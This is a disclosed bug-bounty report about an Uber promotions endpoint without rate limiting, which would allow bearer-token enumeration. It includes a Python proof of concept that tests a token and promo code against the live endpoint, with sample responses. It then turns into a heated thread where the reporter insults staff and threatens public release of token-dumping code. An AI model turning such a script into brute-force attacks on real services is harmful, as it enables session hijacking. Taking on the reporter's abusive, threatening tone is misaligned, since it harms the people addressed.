---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-restriction-of-authentication-attempts
  - env/web
substate: "informative"
weakness: "Improper Restriction of Authentication Attempts"
enriched: true
body: true
date: 2017-12-24
submitted: 2017-11-28T03:34:12.182Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/uber|Uber]]"
reporter: "gregoryvperry"
source: "https://hackerone.com/reports/293359"
title: "The Uber Promo Customer Endpoint Does Not Implement Multifactor Authentication, Blacklisting or Rate Limiting"
---
# The Uber Promo Customer Endpoint Does Not Implement Multifactor Authentication, Blacklisting or Rate Limiting

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Uber | **Disclosed:** 2017-12-24

- Report: [https://hackerone.com/reports/293359](https://hackerone.com/reports/293359)
- CWE: Improper Restriction of Authentication Attempts
- Submitted: 2017-11-28T03:34:12.182Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary
The https://cn-sjc1.uber.com/rt/users/apply-clients-promotions customer endpoint used to apply Uber promotions does not implement multifactor authentication, IP address blacklisting for multiple failed attempts, or IP address-based rate limiting to prevent brute force bearer token enumeration.

## Security Impact
Issued x-uber-tokens are able to be enumerated at rates only limited by an attacker's available bandwidth.

## Reproduction Steps
A massively parallel Golang application was configured to spawn thousands of concurrent HTTP request workers, each with a PRNG-derived  token. Unlike other endpoints within the Uber architecture, https://cn-sjc1.uber.com/rt/users/apply-clients-promotions only requires an x-uber-token and promo code to assess whether the token and/or promo code is valid. By using a valid promo code in conjunction with a randomly-derived x-uber-token, more than a million brute force attempts at enumerating valid bearer tokens was able to be accomplished in a matter of minutes, without any type of IP address blacklisting or rate limiting controls preventing the attack. 

## Specifics
* No account was needed for this brute force enumeration attack against the https://cn-sjc1.uber.com/rt/users/apply-clients-promotions customer endpoint, only a valid promo code

## Impact

An attacker with sufficient bandwidth could enumerate valid x-uber-tokens at high rates of speed, in turn resulting in compromise of privileged account information and hijacking of user sessions associated with those x-uber-tokens.

## Timeline

- **Report Filed**
- **2017-11-28** @fletcher: @gregperry,

Thanks for the report -- we'll take a look and follow-up when we've got more details.

Thanks,
Rob
- **2017-12-01** @gregoryvperry: Python POC, to demonstrate the lack of multifactor authentication and ability to enumerate access tokens with a valid promo code:

```
#!/usr/bin/python

import sys, getopt, requests

def main(argv):
   token = ''
   code = ''
   try:
      opts, args = getopt.getopt(argv,"ht:c:",["token=","code="])
   except getopt.GetoptError:
      print 'promo.py -t <access token> -c <promo code>'
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print 'promo.py -t <access token> -c <promo code>'
         sys.exit()
      elif opt in ("-t", "--token"):
         token = arg
      elif opt in ("-c", "--code"):
         code = arg
   requests.packages.urllib3.disable_warnings()
   response = requests.post(
      'https://cn-sjc1.uber.com/rt/users/apply-clients-promotions',
       headers={                                                                    
                                                                           'x-uber-token': token},
    json={'code': code}, verify=False
)

   print(response.text)

if __name__ == "__main__":
   main(sys.argv[1:])
```
$ python promo.py -t asdfasdfasdf -c gloriac2991ue
{"code":"rtapi.unauthorized","message":"Unauthorized"}

$ python promo.py -t da2e6490-6680-45aa-90c8-86e0c4aace55 -c gloriac2991ue
{"message":"Another invite promotion was already applied","code":"rtapi.users.promotion_error","errorKey":"promotion_invite_code_after_promo_applied","data":{"detailedMessage":""}}
- **Report Informative**
- **2017-12-05** @gregoryvperry: Hi there Lindsay,

The real impact with this vulnerability is the lack of rate limiting and/or IP address blacklisting for multiple successive failed authentication attempts, both issues of which were not mentioned within your summary dismissal of the report. Further, without exhaustive entropy analysis of the PRNG that feeds your token generation process, hand waving about 128 bits is meaningless if there are any discernible patterns that can be picked up in the PRNG. Further, given the fact that at least one of your system architects were apparently high when they designed and implemented your bearer token assignment process without any ability to programmatically expire tokens, you have millions of bearer tokens floating around out there waiting to be discovered with this type of enumeration method, and with a bit more digging into your Oauth2 token assignment process I am confident that I can dump a few million of those unexpired tokens with a side project focused on modeling your PRNG output with a generative deep neural network after I capture a few hundred thousand Oauth2 tokens from your password reset process.

I will not, however, be submitting those results to the Uber Bug Bounty program, but will instead humorously make those findings public including sample code with PyTorch, to drum up some consulting publicity on the tail of Uber’s recent and continuing bad press in the security realm. Because Uber is not a 501(c)(3), nor am I your indentured servant.
 
Or to punctuate all of the above with a more salient, albeit colorful description, Uber’s use of a public bug bounty program with a guaranteed minimum award to attract pro bono security analysis services, but without actually paying any minumum bounties by attributing undisclosed hazards such as this as “out of scope” to skirt payment, is complete bullshit. 

Not completely unexpected though, given the caliber of talent utilized by Uber such as the “security” group that you hail from. You would do well in government security consulting, for sure.

Cheers

Gregory Perry
- **2017-12-06** @gregoryvperry: Oh my God. 

Are you seriously the Program Manager for Uber's Security Division, with a 2013 psych degree and zero relevant industry experience other than technical recruiting?

LULZ
- **2017-12-08** @lindsey-uber: Greg,

I’m sorry to see our conversation turn into a series of personal attacks, but I understand emotions can run hot sometimes, especially when there’s disagreement. A core tenet of our bug bounty program is assume best intent, so we’re happy to provide additional details on our assessment if you’re willing to commit to maintaining a professional dialogue moving forward. 

Thanks.
- **2017-12-11** @fletcher: @gregperry,

After further review, this will be your one and only warning -- if you continue to be hostile and abusive, we will move forward with a program ban.

I'd recommend you practice being a nicer person.

-Rob
- **Agreed On Going Public**
- **2017-12-11** @gregoryvperry: December 8, 2017 comment that was apparently deleted by Uber's staff:
-----
Hello Lindsey,

Not a personal attack at all. Seems like your staff lacks the security expertise to identify flaws within Uber's architecture without getting defensive and adversarial. Not my first rodeo, I've done this countless times and if the corporate culture is one of assessing blame or pointing fingers then it's the security consultant to blame.

To narrow the issue, I wouldn't have expended time and resources on testing areas of Uber's network footprint that were out of scope or irrelevant to your mission. Your team did not properly identify any of those issues on the Uber Bug Bounty page or Treasure Map, so logic seems to dictate that those issues would be ripe for analysis and testing.

If I can find a security flaw or vulnerability that maps to a well known, publicly accepted taxonomy of attacks such as CVE or OWASP, and that security flaw or vulnerability is in use on Uber's enterprise network but without being publicly disclosed on your Bug Bounty or Treasure Map page, then the minimum bounty should be paid for that discovery. Seems simple.

Greg
- **Agreed On Going Public**
- **Report Became Public**
